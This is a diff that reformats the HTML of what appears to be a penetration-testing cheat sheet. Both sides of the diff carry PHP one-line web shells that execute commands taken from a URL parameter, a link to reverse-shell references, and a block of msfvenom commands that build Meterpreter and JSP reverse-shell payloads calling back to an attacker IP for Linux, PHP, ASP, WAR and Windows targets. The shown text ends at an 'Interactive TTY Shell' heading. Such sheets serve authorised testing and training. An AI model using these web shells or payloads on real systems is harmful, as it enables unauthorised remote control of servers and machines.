@@ -36,28 +36,30 @@
     </ul>
     <h2>Shells</h2>
         <h3>PHP</h3>
-        <p> &#60;?php system($_GET["cmd"]); ?&#62; <br> &#60;?php echo shell_exec($_GET["cmd"]); ?&#62; </p>
+        <pre> &#60;?php system($_GET["cmd"]); ?&#62; 
+              &#60;?php echo shell_exec($_GET["cmd"]); ?&#62; 
+        </pre>
 
     <h3>Reverse Shell </h3">
 
-        <p> http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet </p>
+        <pre> http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet </pre>
 
 
-Msfvenom
-#Linux
-msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=443 -f elf > shell.elf
-# PHP
-msfvenom -p php/meterpreter_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f raw > shell.php
-# ASP
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=443 -f asp > shell.asp
-# WAR
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f war > shell.war
-# JSP
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f raw > shell.jsp
-# Exe
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=445 -f exe -o shell_reverse.exe
-
------------------------------------------------------
+    <h3>Msfvenom</h3">
+            <pre>
+            #Linux
+            msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=443 -f elf > shell.elf
+            # PHP
+            msfvenom -p php/meterpreter_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f raw > shell.php
+            # ASP
+            msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=443 -f asp > shell.asp
+            # WAR
+            msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f war > shell.war
+            # JSP
+            msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f raw > shell.jsp
+            # Exe
+            msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=445 -f exe -o shell_reverse.exe
+            </pre>
 
 Interactive TTY Shell
 # python
